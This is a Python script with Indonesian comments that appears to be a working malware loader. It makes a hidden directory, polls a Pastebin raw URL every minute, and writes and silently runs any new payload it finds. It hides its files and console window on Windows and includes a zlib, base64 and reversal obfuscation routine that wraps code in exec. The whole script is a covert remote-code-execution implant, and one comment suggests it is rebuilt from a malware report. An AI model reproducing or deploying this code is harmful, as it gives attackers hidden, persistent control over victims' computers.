import os
import sys
import platform
import requests
import subprocess
import time
import base64
import zlib

# Konfigurasi Pastebin
PASTEBIN_URL = "https://pastebin.com/raw/XXXXXXXX"  # Ganti dengan kode Pastebin Anda
PASTEBIN_CHECK_INTERVAL = 60  # Interval pengecekan (detik)
HIDDEN_DIR = os.path.expanduser("~/.n2")  # Direktori tersembunyi untuk menyimpan payload


# Fungsi untuk mengobfuskasi kode satu lapisan (opsional, sesuai laporan)
def obfuscate_layer(code):
    code_bytes = code.encode('utf-8')
    compressed = zlib.compress(code_bytes)
    base64_encoded = base64.b64encode(compressed)
    reversed_str = base64_encoded[::-1]
    return f"exec(__import__('zlib').decompress(__import__('base64').b64decode('{reversed_str.decode('utf-8')}'[::-1])))"


# Fungsi untuk mendeteksi OS
def detect_os():
    os_type = platform.system().lower()
    if "windows" in os_type:
        return "windows"
    elif "darwin" in os_type:
        return "macos"
    elif "linux" in os_type:
        return "linux"
    else:
        return "unknown"


# Fungsi untuk membuat direktori tersembunyi
def setup_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        # Sembunyikan direktori di Windows
        if detect_os() == "windows":
            subprocess.run(["attrib", "+h", HIDDEN_DIR], shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)


# Fungsi untuk mengambil payload dari Pastebin
def fetch_payload_from_pastebin(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            print(f"[-] Gagal mengambil payload dari Pastebin: Status {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error saat mengambil payload dari Pastebin: {e}")
        return None


# Fungsi untuk menyimpan dan mengeksekusi payload
def execute_payload(payload_content, filename="payload_from_pastebin.py"):
    os_type = detect_os()
    filepath = os.path.join(HIDDEN_DIR, filename)

    try:
        # Simpan payload ke file
        with open(filepath, "w") as f:
            f.write(payload_content)

        # Sembunyikan file di Windows
        if os_type == "windows":
            subprocess.run(["attrib", "+h", filepath], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Eksekusi payload
        if os_type == "windows":
            subprocess.Popen(["python", filepath], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        else:
            subprocess.Popen(["python3", filepath], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"[+] Payload dari Pastebin berhasil dieksekusi: {filepath}")
    except Exception as e:
        print(f"[-] Gagal mengeksekusi payload: {e}")


# Fungsi utama Unknown Code
def unknown_code():
    print("[*] Unknown Code dimulai...")
    setup_hidden_dir()

    last_payload = None  # Untuk melacak perubahan payload

    while True:
        try:
            # Ambil payload dari Pastebin
            payload_content = fetch_payload_from_pastebin(PASTEBIN_URL)

            if payload_content and payload_content != last_payload:
                print("[*] Payload baru ditemukan di Pastebin")
                execute_payload(payload_content)
                last_payload = payload_content
            else:
                print("[*] Tidak ada perubahan payload atau payload kosong")

            time.sleep(PASTEBIN_CHECK_INTERVAL)
        except Exception as e:
            print(f"[-] Error dalam loop utama: {e}")
            time.sleep(PASTEBIN_CHECK_INTERVAL)


if __name__ == "__main__":
    # Sembunyikan konsol di Windows
    if detect_os() == "windows":
        import win32gui, win32con

        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

    unknown_code()